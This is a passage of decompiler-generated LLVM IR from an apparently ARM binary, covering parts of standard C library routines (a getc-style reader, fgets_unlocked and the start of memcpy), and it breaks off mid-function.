  %v2_16da0 = phi i32 [ %v0_16d60.pre, %dec_label_pc_16d50.dec_label_pc_16d60_crit_edge ], [ %v0_16d18, %dec_label_pc_16d40 ]
  %v1_16d60 = inttoptr i32 %v2_16da0 to i16*
  %v2_16d60 = load i16, i16* %v1_16d60, align 2
  %v3_16d60 = zext i16 %v2_16d60 to i32
  store i32 %v3_16d60, i32* %r2.global-to-local, align 4
  %v1_16d64 = and i32 %v3_16d60, 2
  %v2_16d64 = icmp eq i32 %v1_16d64, 0
  br i1 %v2_16d64, label %dec_label_pc_16d90, label %dec_label_pc_16d6c

dec_label_pc_16d6c:                               ; preds = %dec_label_pc_16d60
  %tmp26 = urem i16 %v2_16d60, 2
  %v1_16d6c = zext i16 %tmp26 to i32
  %tmp22 = sub nsw i32 0, %v1_16d6c
  %v4_16d70 = and i32 %tmp22, 4
  %v5_16d70 = add i32 %v4_16d70, %v2_16da0
  %v1_16d74 = add i32 %v5_16d70, 36
  %v2_16d74 = inttoptr i32 %v1_16d74 to i8*
  %v3_16d74 = load i8, i8* %v2_16d74, align 1
  %v4_16d74 = zext i8 %v3_16d74 to i32
  %v1_16d78 = add nsw i32 %v3_16d60, -1
  store i32 %v1_16d78, i32* %r2.global-to-local, align 4
  store i32 %v4_16d74, i32* %r0.global-to-local, align 4
  %v2_16d84 = add i32 %v2_16da0, 40
  %v3_16d84 = inttoptr i32 %v2_16d84 to i32*
  store i32 0, i32* %v3_16d84, align 4
  %v0_16d88 = load i32, i32* %r2.global-to-local, align 4
  %v1_16d88 = trunc i32 %v0_16d88 to i16
  %v2_16d88 = load i32, i32* @r4, align 4
  %v3_16d88 = inttoptr i32 %v2_16d88 to i16*
  store i16 %v1_16d88, i16* %v3_16d88, align 2
  br label %dec_label_pc_16e2c

dec_label_pc_16d90:                               ; preds = %dec_label_pc_16d60
  %v1_16d90 = add i32 %v2_16da0, 16
  %v1_16d94 = inttoptr i32 %v1_16d90 to i32*
  %v2_16d94 = load i32, i32* %v1_16d94, align 4
  store i32 %v2_16d94, i32* @r1, align 4
  %v3_16d94 = add i32 %v2_16da0, 20
  %v4_16d94 = inttoptr i32 %v3_16d94 to i32*
  %v5_16d94 = load i32, i32* %v4_16d94, align 4
  %v9_16d98 = icmp eq i32 %v5_16d94, %v2_16d94
  br i1 %v9_16d98, label %dec_label_pc_16da8, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_16d90
  %v2_16d9c = inttoptr i32 %v2_16d94 to i8*
  %v3_16d9c = load i8, i8* %v2_16d9c, align 1
  %v4_16d9c = zext i8 %v3_16d9c to i32
  store i32 %v4_16d9c, i32* %r0.global-to-local, align 4
  %v6_16d9c = add i32 %v2_16d94, 1
  store i32 %v6_16d9c, i32* @r1, align 4
  store i32 %v6_16d9c, i32* %v1_16d94, align 4
  br label %dec_label_pc_16e2c

dec_label_pc_16da8:                               ; preds = %dec_label_pc_16d90
  %v1_16da8 = add i32 %v2_16da0, 4
  %v2_16da8 = inttoptr i32 %v1_16da8 to i32*
  %v3_16da8 = load i32, i32* %v2_16da8, align 4
  %v7_16dac = icmp eq i32 %v3_16da8, -2
  br i1 %v7_16dac, label %.thread7, label %dec_label_pc_16dc0

.thread7:                                         ; preds = %dec_label_pc_16da8
  %v2_16db0 = or i16 %v2_16d60, 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i16 %v2_16db0, i16* %v1_16d60, align 2
  br label %dec_label_pc_16e2c

dec_label_pc_16dc0:                               ; preds = %dec_label_pc_16da8
  %v1_16dc0 = and i32 %v3_16d60, 768
  %v2_16dc0 = icmp eq i32 %v1_16dc0, 0
  br i1 %v2_16dc0, label %.thread9, label %bb23

bb23:                                             ; preds = %dec_label_pc_16dc0
  %v1_16dc8 = load i32, i32* @r5, align 4
  %v3_16dc8 = add i32 %v1_16dc8, 76
  %v4_16dc8 = inttoptr i32 %v3_16dc8 to i32*
  %v5_16dc8 = load i32, i32* %v4_16dc8, align 4
  store i32 %v5_16dc8, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_16dc0, %bb23
  store i32 93648, i32* @lr, align 4
  %v1_16dcc = xor i1 %v2_16dc0, true
  call void @__pseudo_cond_branch(i1 %v1_16dcc, i32 ptrtoint (i32* @global_var_16968.587 to i32))
  %v0_16dd0 = load i32, i32* @r4, align 4
  %v1_16dd0 = add i32 %v0_16dd0, 8
  store i32 %v1_16dd0, i32* %r2.global-to-local, align 4
  %v1_16dd4 = inttoptr i32 %v1_16dd0 to i32*
  %v2_16dd4 = load i32, i32* %v1_16dd4, align 4
  store i32 %v2_16dd4, i32* %r2.global-to-local, align 4
  %v3_16dd4 = add i32 %v0_16dd0, 12
  %v4_16dd4 = inttoptr i32 %v3_16dd4 to i32*
  %v5_16dd4 = load i32, i32* %v4_16dd4, align 4
  %v9_16dd8 = icmp eq i32 %v5_16dd4, %v2_16dd4
  br i1 %v9_16dd8, label %dec_label_pc_16e0c, label %dec_label_pc_16de0

dec_label_pc_16de0:                               ; preds = %.thread9
  %v2_16de0 = add i32 %v0_16dd0, 24
  %v3_16de0 = inttoptr i32 %v2_16de0 to i32*
  store i32 %v2_16dd4, i32* %v3_16de0, align 4
  %v0_16de4 = load i32, i32* @r4, align 4
  store i32 %v0_16de4, i32* %r0.global-to-local, align 4
  %v2_16de8 = call i32 @__stdio_rfill(i32 %v0_16de4)
  store i32 %v2_16de8, i32* %r0.global-to-local, align 4
  %v2_16dec = icmp eq i32 %v2_16de8, 0
  br i1 %v2_16dec, label %dec_label_pc_16e28, label %dec_label_pc_16df4

dec_label_pc_16df4:                               ; preds = %dec_label_pc_16de0
  %v0_16df4 = load i32, i32* @r4, align 4
  %v1_16df4 = add i32 %v0_16df4, 20
  %v2_16df4 = inttoptr i32 %v1_16df4 to i32*
  %v3_16df4 = load i32, i32* %v2_16df4, align 4
  %v2_16df8 = add i32 %v0_16df4, 24
  %v3_16df8 = inttoptr i32 %v2_16df8 to i32*
  store i32 %v3_16df4, i32* %v3_16df8, align 4
  %v0_16dfc = load i32, i32* @r4, align 4
  %v1_16dfc = add i32 %v0_16dfc, 16
  %v2_16dfc = inttoptr i32 %v1_16dfc to i32*
  %v3_16dfc = load i32, i32* %v2_16dfc, align 4
  %v1_16e00 = inttoptr i32 %v3_16dfc to i8*
  %v2_16e00 = load i8, i8* %v1_16e00, align 1
  %v3_16e00 = zext i8 %v2_16e00 to i32
  store i32 %v3_16e00, i32* %r0.global-to-local, align 4
  %v5_16e00 = add i32 %v3_16dfc, 1
  store i32 %v5_16e00, i32* %v2_16dfc, align 4
  br label %dec_label_pc_16e2c

dec_label_pc_16e0c:                               ; preds = %.thread9
  %v1_16e0c = inttoptr i32 %v0_16dd0 to i16*
  store i32 %v0_16dd0, i32* %r0.global-to-local, align 4
  %v2_16e10 = ptrtoint i8* %stack_var_-17 to i32
  store i32 %v2_16e10, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_16e18 = call i32 @__stdio_READ(i16* %v1_16e0c, i32 %v2_16e10, i32 1)
  store i32 %v5_16e18, i32* %r0.global-to-local, align 4
  %v2_16e1c = icmp eq i32 %v5_16e18, 0
  br i1 %v2_16e1c, label %dec_label_pc_16e28, label %bb24

bb24:                                             ; preds = %dec_label_pc_16e0c
  %v4_16e20 = load i8, i8* %stack_var_-17, align 1
  %v5_16e20 = sext i8 %v4_16e20 to i32
  store i32 %v5_16e20, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16e2c

dec_label_pc_16e28:                               ; preds = %dec_label_pc_16e0c, %dec_label_pc_16d50, %dec_label_pc_16de0
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16e2c

dec_label_pc_16e2c:                               ; preds = %bb, %.thread7, %bb24, %.thread4, %dec_label_pc_16df4, %dec_label_pc_16d6c, %dec_label_pc_16e28
  %v2_16e30 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_16e30, i32* @r4, align 4
  store i32 %v6_16d14, i32* @r5, align 4
  store i32 %v9_16d14, i32* @lr, align 4
  %v1_16e34 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_16e34

; uselistorder directives
  uselistorder i32 %v2_16d94, { 1, 0, 2, 3 }
  uselistorder i32 %v2_16da0, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 %v3_16d18, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-17, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 11, 0, 1, 4, 2, 3, 6, 5, 7, 8, 9, 10, 13, 12 }
  uselistorder i32 768, { 2, 0, 3, 1, 4 }
  uselistorder label %dec_label_pc_16e2c, { 6, 2, 4, 1, 3, 5, 0 }
  uselistorder label %dec_label_pc_16e28, { 0, 2, 1 }
  uselistorder label %.thread9, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v9_16e40 = load i32, i32* @r6, align 4
  %v12_16e40 = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16e44 = icmp eq i32 %arg2, 0
  store i1 %v2_16e44, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %tmp22 = icmp slt i32 %arg2, 1
  br i1 %tmp22, label %dec_label_pc_16ecc, label %dec_label_pc_16eb4.preheader

dec_label_pc_16eb4.preheader:                     ; preds = %entry
  store i32 %tmp, i32* @r5, align 4
  %v1_16eb42 = add i32 %arg2, -1
  store i32 %v1_16eb42, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_16eb48 = icmp eq i32 %arg2, 1
  store i1 %v7_16eb48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16eb48, label %dec_label_pc_16ebc, label %dec_label_pc_16e60

dec_label_pc_16e60:                               ; preds = %dec_label_pc_16eb4.preheader, %dec_label_pc_16eb4.backedge.dec_label_pc_16e60_crit_edge
  %v0_16e84 = phi i32 [ %v0_16e60.pre, %dec_label_pc_16eb4.backedge.dec_label_pc_16e60_crit_edge ], [ %arg3, %dec_label_pc_16eb4.preheader ]
  %v1_16e60 = add i32 %v0_16e84, 16
  %v2_16e60 = inttoptr i32 %v1_16e60 to i32*
  %v3_16e60 = load i32, i32* %v2_16e60, align 4
  store i32 %v3_16e60, i32* %r2.global-to-local, align 4
  %v1_16e64 = add i32 %v0_16e84, 24
  %v2_16e64 = inttoptr i32 %v1_16e64 to i32*
  %v3_16e64 = load i32, i32* %v2_16e64, align 4
  store i32 %v3_16e64, i32* %r3.global-to-local, align 4
  %v3_16e68 = icmp uge i32 %v3_16e60, %v3_16e64
  store i1 %v3_16e68, i1* %cpsr_c.global-to-local, align 1
  %v9_16e68 = icmp eq i32 %v3_16e60, %v3_16e64
  store i1 %v9_16e68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_16e68, label %dec_label_pc_16e84, label %dec_label_pc_16e70

dec_label_pc_16e70:                               ; preds = %dec_label_pc_16e60
  %v1_16e70 = inttoptr i32 %v3_16e60 to i8*
  %v2_16e70 = load i8, i8* %v1_16e70, align 1
  %v3_16e70 = zext i8 %v2_16e70 to i32
  store i32 %v3_16e70, i32* %r3.global-to-local, align 4
  %v5_16e70 = add i32 %v3_16e60, 1
  store i32 %v5_16e70, i32* %r2.global-to-local, align 4
  %v2_16e74 = load i32, i32* @r5, align 4
  %v3_16e74 = inttoptr i32 %v2_16e74 to i8*
  store i8 %v2_16e70, i8* %v3_16e74, align 1
  %v4_16e74 = load i32, i32* @r5, align 4
  %v5_16e74 = add i32 %v4_16e74, 1
  store i32 %v5_16e74, i32* @r5, align 4
  %v0_16e78 = load i32, i32* %r3.global-to-local, align 4
  %v2_16e78 = icmp ugt i32 %v0_16e78, 9
  store i1 %v2_16e78, i1* %cpsr_c.global-to-local, align 1
  %v7_16e78 = icmp eq i32 %v0_16e78, 10
  store i1 %v7_16e78, i1* %cpsr_z.global-to-local, align 1
  %v0_16e7c = load i32, i32* %r2.global-to-local, align 4
  %v1_16e7c = load i32, i32* @r4, align 4
  %v2_16e7c = add i32 %v1_16e7c, 16
  %v3_16e7c = inttoptr i32 %v2_16e7c to i32*
  store i32 %v0_16e7c, i32* %v3_16e7c, align 4
  br i1 %v7_16e78, label %dec_label_pc_16ebc, label %dec_label_pc_16eb4.backedge

dec_label_pc_16e84:                               ; preds = %dec_label_pc_16e60
  %v1_16e84 = inttoptr i32 %v0_16e84 to i16*
  %v3_16e88 = call i32 @getc_unlocked(i16* %v1_16e84)
  %v3_16e8c = icmp eq i32 %v3_16e88, -1
  store i1 %v3_16e8c, i1* %cpsr_c.global-to-local, align 1
  %v8_16e8c = icmp eq i32 %v3_16e88, -1
  store i1 %v8_16e8c, i1* %cpsr_z.global-to-local, align 1
  %v1_16e90 = urem i32 %v3_16e88, 256
  store i32 %v1_16e90, i32* %r3.global-to-local, align 4
  br i1 %v3_16e8c, label %dec_label_pc_16e98, label %dec_label_pc_16eb0

dec_label_pc_16e98:                               ; preds = %dec_label_pc_16e84
  %v0_16e98 = load i32, i32* @r4, align 4
  %v1_16e98 = inttoptr i32 %v0_16e98 to i16*
  %v2_16e98 = load i16, i16* %v1_16e98, align 2
  %v3_16e98 = zext i16 %v2_16e98 to i32
  store i32 %v3_16e98, i32* %r3.global-to-local, align 4
  %v1_16e9c = and i32 %v3_16e98, 8
  %v2_16e9c = icmp eq i32 %v1_16e9c, 0
  store i1 %v2_16e9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16e9c, label %dec_label_pc_16ebc, label %dec_label_pc_16ecc

dec_label_pc_16eb0:                               ; preds = %dec_label_pc_16e84
  %v1_16ea8 = trunc i32 %v3_16e88 to i8
  %v2_16ea8 = load i32, i32* @r5, align 4
  %v3_16ea8 = inttoptr i32 %v2_16ea8 to i8*
  store i8 %v1_16ea8, i8* %v3_16ea8, align 1
  %v4_16ea8 = load i32, i32* @r5, align 4
  %v5_16ea8 = add i32 %v4_16ea8, 1
  store i32 %v5_16ea8, i32* @r5, align 4
  %v0_16eac = load i32, i32* %r3.global-to-local, align 4
  %v2_16eac = icmp ugt i32 %v0_16eac, 9
  store i1 %v2_16eac, i1* %cpsr_c.global-to-local, align 1
  %v7_16eac = icmp eq i32 %v0_16eac, 10
  store i1 %v7_16eac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16eac, label %dec_label_pc_16ebc, label %dec_label_pc_16eb4.backedge

dec_label_pc_16eb4.backedge:                      ; preds = %dec_label_pc_16eb0, %dec_label_pc_16e70
  %v0_16eb4 = load i32, i32* @r6, align 4
  %v1_16eb4 = add i32 %v0_16eb4, -1
  store i32 %v1_16eb4, i32* @r6, align 4
  %v2_16eb4 = icmp ne i32 %v0_16eb4, 0
  store i1 %v2_16eb4, i1* %cpsr_c.global-to-local, align 1
  %v7_16eb4 = icmp eq i32 %v0_16eb4, 1
  store i1 %v7_16eb4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16eb4, label %dec_label_pc_16ebc, label %dec_label_pc_16eb4.backedge.dec_label_pc_16e60_crit_edge

dec_label_pc_16eb4.backedge.dec_label_pc_16e60_crit_edge: ; preds = %dec_label_pc_16eb4.backedge
  %v0_16e60.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_16e60

dec_label_pc_16ebc:                               ; preds = %dec_label_pc_16eb0, %dec_label_pc_16eb4.backedge, %dec_label_pc_16e70, %dec_label_pc_16eb4.preheader, %dec_label_pc_16e98
  %v0_16ebc = load i32, i32* @r5, align 4
  %v1_16ebc = load i32, i32* @r7, align 4
  %v3_16ebc = icmp uge i32 %v0_16ebc, %v1_16ebc
  store i1 %v3_16ebc, i1* %cpsr_c.global-to-local, align 1
  %v9_16ebc = icmp eq i32 %v0_16ebc, %v1_16ebc
  store i1 %v9_16ebc, i1* %cpsr_z.global-to-local, align 1
  %v2_16ec0 = xor i1 %v9_16ebc, true
  %v3_16ec0 = and i1 %v3_16ebc, %v2_16ec0
  br i1 %v3_16ec0, label %bb, label %.thread14

bb:                                               ; preds = %dec_label_pc_16ebc
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_16ec4 = inttoptr i32 %v0_16ebc to i8*
  store i8 0, i8* %v7_16ec4, align 1
  %v0_16ec8.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_16ec8.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_16ebc, %bb
  %v1_16ec8 = phi i1 [ %v1_16ec8.pre, %bb ], [ %v9_16ebc, %dec_label_pc_16ebc ]
  %v0_16ec8 = phi i1 [ %v0_16ec8.pre, %bb ], [ %v3_16ebc, %dec_label_pc_16ebc ]
  %v2_16ec8 = xor i1 %v1_16ec8, true
  %v3_16ec8 = and i1 %v0_16ec8, %v2_16ec8
  br i1 %v3_16ec8, label %.dec_label_pc_16ed0_crit_edge, label %dec_label_pc_16ecc

.dec_label_pc_16ed0_crit_edge:                    ; preds = %.thread14
  %v0_16ed0.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_16ed0

dec_label_pc_16ecc:                               ; preds = %entry, %dec_label_pc_16e98, %.thread14
  br label %dec_label_pc_16ed0

dec_label_pc_16ed0:                               ; preds = %.dec_label_pc_16ed0_crit_edge, %dec_label_pc_16ecc
  %v0_16ed0 = phi i32 [ %v0_16ed0.pre, %.dec_label_pc_16ed0_crit_edge ], [ 0, %dec_label_pc_16ecc ]
  store i32 %v9_16e40, i32* @r6, align 4
  store i32 %v12_16e40, i32* @r7, align 4
  ret i32 %v0_16ed0

; uselistorder directives
  uselistorder i1 %v9_16ebc, { 1, 0, 2 }
  uselistorder i32 %v1_16ebc, { 1, 0 }
  uselistorder i32 %v0_16ebc, { 0, 2, 1 }
  uselistorder i32 %v0_16eb4, { 2, 0, 1 }
  uselistorder i32 %v0_16eac, { 1, 0 }
  uselistorder i32 %v3_16e88, { 2, 1, 0, 3 }
  uselistorder i32 %v0_16e78, { 1, 0 }
  uselistorder i32 %v3_16e60, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_16e84, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 8, 3, 4, 5, 6, 7, 0, 9 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 7, 3, 4, 5, 6, 0, 8 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_16ed0, { 1, 0 }
  uselistorder label %dec_label_pc_16ecc, { 2, 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_16ebc, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_16e60, { 1, 0 }
}

define i32 @_memcpy() local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_16ee0 = load i32, i32* @r1, align 4
  %v1_16ee0 = load i32, i32* @r0, align 4
  %v2_16ee0 = sub i32 %v0_16ee0, %v1_16ee0
  %v3_16ee0 = icmp ult i32 %v0_16ee0, %v1_16ee0
  %v4_16ee0 = xor i32 %v1_16ee0, %v0_16ee0
  %v5_16ee0 = xor i32 %v2_16ee0, %v0_16ee0
  %v6_16ee0 = and i32 %v5_16ee0, %v4_16ee0
  %v7_16ee0 = icmp slt i32 %v6_16ee0, 0
  store i1 %v7_16ee0, i1* %cpsr_v.global-to-local, align 1
  %v8_16ee0 = icmp slt i32 %v2_16ee0, 0
  store i1 %v8_16ee0, i1* %cpsr_n.global-to-local, align 1
  %v9_16ee0 = icmp eq i32 %v0_16ee0, %v1_16ee0
  store i1 %v9_16ee0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_16ee0, label %dec_label_pc_17134, label %dec_label_pc_16ee8

dec_label_pc_16ee8:                               ; preds = %entry
  br i1 %v9_16ee0, label %.thread130, label %bb

.thread130:                                       ; preds = %bb153, %.thread129, %bb150, %dec_label_pc_16ee8
  %merge = phi i32 [ %v0_16ee0, %dec_label_pc_16ee8 ], [ %v2_171c8, %bb150 ], [ %v11_171e4, %bb153 ], [ %v7_171e4, %.thread129 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_16ee8
  %v5_16eec = inttoptr i32 %v1_16ee0 to i8*
  store i8* %v5_16eec, i8** %stack_var_-8, align 4
  %v8_16eec = load i32, i32* @lr, align 4
  %v0_16ef0 = load i32, i32* @r2, align 4
  %v2_16ef0 = add i32 %v0_16ef0, -4
  store i32 %v2_16ef0, i32* %r2.global-to-local, align 4
  %v4_16ef0 = sub i32 3, %v0_16ef0
  %v5_16ef0 = and i32 %v4_16ef0, %v0_16ef0
  %v6_16ef0 = icmp slt i32 %v5_16ef0, 0
  store i1 %v6_16ef0, i1* %cpsr_v.global-to-local, align 1
  %v7_16ef0 = icmp slt i32 %v2_16ef0, 0
  store i1 %v7_16ef0, i1* %cpsr_n.global-to-local, align 1
  %v8_16ef0 = icmp eq i32 %v0_16ef0, 4
  store i1 %v8_16ef0, i1* %cpsr_z.global-to-local, align 1
  %v5_16ef4 = icmp slt i32 %v0_16ef0, 4
  br i1 %v5_16ef4, label %bb140, label %dec_label_pc_16ef8

dec_label_pc_16ef8:                               ; preds = %bb
  %v1_16ef8 = urem i32 %v1_16ee0, 4
  store i32 %v1_16ef8, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16ef8 = icmp eq i32 %v1_16ef8, 0
  store i1 %v2_16ef8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16ef8, label %dec_label_pc_16f00, label %dec_label_pc_16fac

dec_label_pc_16f00:                               ; preds = %dec_label_pc_16ef8
  %v1_16f00 = urem i32 %v0_16ee0, 4
  store i32 %v1_16f00, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16f00 = icmp eq i32 %v1_16f00, 0
  store i1 %v2_16f00, i1* %cpsr_z.global-to-local, align 1
  %extract.t = trunc i32 %v0_16ee0 to i2
  br i1 %v2_16f00, label %dec_label_pc_16f08, label %dec_label_pc_16fdc

dec_label_pc_16f08:                               ; preds = %dec_label_pc_16f00, %dec_label_pc_16fd4
  %v0_16f2094 = phi i32 [ %v1_16ee0, %dec_label_pc_16f00 ], [ %v0_170fc77, %dec_label_pc_16fd4 ]
  %v0_16f1c93 = phi i32 [ %v0_16ee0, %dec_label_pc_16f00 ], [ %v0_16fd4, %dec_label_pc_16fd4 ]
  %v0_16f08 = phi i32 [ %v2_16ef0, %dec_label_pc_16f00 ], [ %v2_16fcc, %dec_label_pc_16fd4 ]
  %v1_16f08 = add i32 %v0_16f08, -8
  store i32 %v1_16f08, i32* %r2.global-to-local, align 4
  %v3_16f08 = sub i32 7, %v0_16f08
  %v4_16f08 = and i32 %v3_16f08, %v0_16f08
  %v5_16f08 = icmp slt i32 %v4_16f08, 0
  store i1 %v5_16f08, i1* %cpsr_v.global-to-local, align 1
  %v6_16f08 = icmp slt i32 %v1_16f08, 0
  store i1 %v6_16f08, i1* %cpsr_n.global-to-local, align 1
  %v7_16f08 = icmp eq i32 %v0_16f08, 8
  store i1 %v7_16f08, i1* %cpsr_z.global-to-local, align 1
  %v2_16f0c = xor i1 %v6_16f08, %v5_16f08
  br i1 %v2_16f0c, label %dec_label_pc_16f5c, label %dec_label_pc_16f10

dec_label_pc_16f10:                               ; preds = %dec_label_pc_16f08
  %v1_16f10 = add i32 %v0_16f08, -28
  store i32 %v1_16f10, i32* %r2.global-to-local, align 4
  %v3_16f10 = sub i32 27, %v0_16f08
  %v4_16f10 = and i32 %v3_16f10, %v1_16f08
  %v5_16f10 = icmp slt i32 %v4_16f10, 0
  store i1 %v5_16f10, i1* %cpsr_v.global-to-local, align 1
  %v6_16f10 = icmp slt i32 %v1_16f10, 0
  store i1 %v6_16f10, i1* %cpsr_n.global-to-local, align 1
  %v7_16f10 = icmp eq i32 %v1_16f08, 20
  store i1 %v7_16f10, i1* %cpsr_z.global-to-local, align 1
  %v2_16f14 = xor i1 %v6_16f10, %v5_16f10
  br i1 %v2_16f14, label %dec_label_pc_16f48, label %dec_label_pc_16f18

dec_label_pc_16f18:                               ; preds = %dec_label_pc_16f10
  %v0_16f18 = load i32, i32* @r4, align 4
  store i32 %v0_16f18, i32* %stack_var_-12, align 4
  br label %dec_label_pc_16f1c

dec_label_pc_16f1c:                               ; preds = %dec_label_pc_16f1c.dec_label_pc_16f1c_crit_edge, %dec_label_pc_16f18
  %v0_16f20 = phi i32 [ %v12_16f28, %dec_label_pc_16f1c.dec_label_pc_16f1c_crit_edge ], [ %v0_16f2094, %dec_label_pc_16f18 ]
  %v0_16f1c = phi i32 [ %v0_16f1c.pre, %dec_label_pc_16f1c.dec_label_pc_16f1c_crit_edge ], [ %v0_16f1c93, %dec_label_pc_16f18 ]
  %v1_16f1c = inttoptr i32 %v0_16f1c to i32*
  %v2_16f1c = load i32, i32* %v1_16f1c, align 4
  %v3_16f1c = add i32 %v0_16f1c, 4
  %v4_16f1c = inttoptr i32 %v3_16f1c to i32*
  %v5_16f1c = load i32, i32* %v4_16f1c, align 4
  store i32 %v5_16f1c, i32* %r4.global-to-local, align 4
  %v6_16f1c = add i32 %v0_16f1c, 8
  %v7_16f1c = inttoptr i32 %v6_16f1c to i32*
  %v8_16f1c = load i32, i32* %v7_16f1c, align 4
  store i32 %v8_16f1c, i32* %ip.global-to-local, align 4
  %v9_16f1c = add i32 %v0_16f1c, 12
  %v10_16f1c = inttoptr i32 %v9_16f1c to i32*
  %v11_16f1c = load i32, i32* %v10_16f1c, align 4
  store i32 %v11_16f1c, i32* %lr.global-to-local, align 4
  %v12_16f1c = add i32 %v0_16f1c, 16
  store i32 %v12_16f1c, i32* %r1.global-to-local, align 4
  %v1_16f20 = inttoptr i32 %v0_16f20 to i32*
  store i32 %v2_16f1c, i32* %v1_16f20, align 4
  %v3_16f20 = add i32 %v0_16f20, 4
  %v4_16f20 = inttoptr i32 %v3_16f20 to i32*
  %v5_16f20 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_16f20, i32* %v4_16f20, align 4
  %v6_16f20 = add i32 %v0_16f20, 8
  %v7_16f20 = inttoptr i32 %v6_16f20 to i32*
  %v8_16f20 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_16f20, i32* %v7_16f20, align 4
  %v9_16f20 = add i32 %v0_16f20, 12
  %v10_16f20 = inttoptr i32 %v9_16f20 to i32*
  %v11_16f20 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_16f20, i32* %v10_16f20, align 4
  %v12_16f20 = add i32 %v0_16f20, 16
  store i32 %v12_16f20, i32* %r0.global-to-local, align 4
  %v0_16f24 = load i32, i32* %r1.global-to-local, align 4
  %v1_16f24 = inttoptr i32 %v0_16f24 to i32*
  %v2_16f24 = load i32, i32* %v1_16f24, align 4
  store i32 %v2_16f24, i32* @r3, align 4
  %v3_16f24 = add i32 %v0_16f24, 4
  %v4_16f24 = inttoptr i32 %v3_16f24 to i32*
  %v5_16f24 = load i32, i32* %v4_16f24, align 4
  store i32 %v5_16f24, i32* %r4.global-to-local, align 4
  %v6_16f24 = add i32 %v0_16f24, 8
  %v7_16f24 = inttoptr i32 %v6_16f24 to i32*
  %v8_16f24 = load i32, i32* %v7_16f24, align 4
  store i32 %v8_16f24, i32* @ip, align 4
  %v9_16f24 = add i32 %v0_16f24, 12
  %v10_16f24 = inttoptr i32 %v9_16f24 to i32*
  %v11_16f24 = load i32, i32* %v10_16f24, align 4
  store i32 %v11_16f24, i32* %lr.global-to-local, align 4
  %v12_16f24 = add i32 %v0_16f24, 16
  store i32 %v12_16f24, i32* @r1, align 4
  %v1_16f28 = inttoptr i32 %v12_16f20 to i32*
  store i32 %v2_16f24, i32* %v1_16f28, align 4
  %v3_16f28 = add i32 %v0_16f20, 20
  %v4_16f28 = inttoptr i32 %v3_16f28 to i32*
  %v5_16f28 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_16f28, i32* %v4_16f28, align 4
  %v6_16f28 = add i32 %v0_16f20, 24
  %v7_16f28 = inttoptr i32 %v6_16f28 to i32*
  %v8_16f28 = load i32, i32* @ip, align 4
  store i32 %v8_16f28, i32* %v7_16f28, align 4
  %v9_16f28 = add i32 %v0_16f20, 28
  %v10_16f28 = inttoptr i32 %v9_16f28 to i32*
  %v11_16f28 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_16f28, i32* %v10_16f28, align 4
  %v12_16f28 = add i32 %v0_16f20, 32
  store i32 %v12_16f28, i32* @r0, align 4
  %v0_16f2c = load i32, i32* %r2.global-to-local, align 4
  %v1_16f2c = add i32 %v0_16f2c, -32
